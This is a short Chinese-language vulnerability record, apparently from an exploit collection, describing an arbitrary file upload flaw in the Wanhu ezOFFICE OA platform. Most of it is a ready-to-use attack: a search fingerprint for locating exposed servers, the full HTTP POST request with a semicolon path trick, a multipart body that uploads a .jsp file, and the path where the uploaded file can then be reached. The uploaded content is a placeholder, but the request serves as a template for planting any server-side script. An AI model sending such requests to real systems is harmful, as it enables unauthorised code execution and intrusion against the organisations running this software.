# 万户协同办公平台senddocument_import存在任意文件上传漏洞

- **系统**：万户协同办公平台　|　**类型**：文件上传　|　**CVE**：—
- **指纹**：`app.name="万户 Ezoffice OA"`
- **请求**：`POST /defaultroot/modules/govoffice/gov_documentmanager/senddocument_import.jsp;?categoryId=null&path=loginpage&mode=add&fileName=null&saveName=null&fileMaxSize=0&fileMaxNum=null&fileType=jsp HTTP/1.1`
- **关键头**：`Content-Type: multipart/form-data; boundary=00content0boundary00`　`Host: xx.xx.xx.xx`　`Content-Length: 288`

**请求体 / payload**
```
--00content0boundary00
Content-Disposition: form-data; name="photo"; filename="stc.jsp"
stc
--00content0boundary00
Content-Disposition: form-data; name="continueUpload"
0
--00content0boundary00
Content-Disposition: form-data; name="submit"
导入
--00content0boundary00--

上传文件位置,注意最后需添加一个`;`
/defaultroot/upload/loginpage/2023112001240329341614287.jsp;
```

**其他**
- 万户协同办公平台senddocument\_import存在任意文件上传漏洞: * 一、漏洞简介
* 二、影响版本
* 三、资产测绘
* 四、漏洞复现
***
- 版本: * 万户ezoffice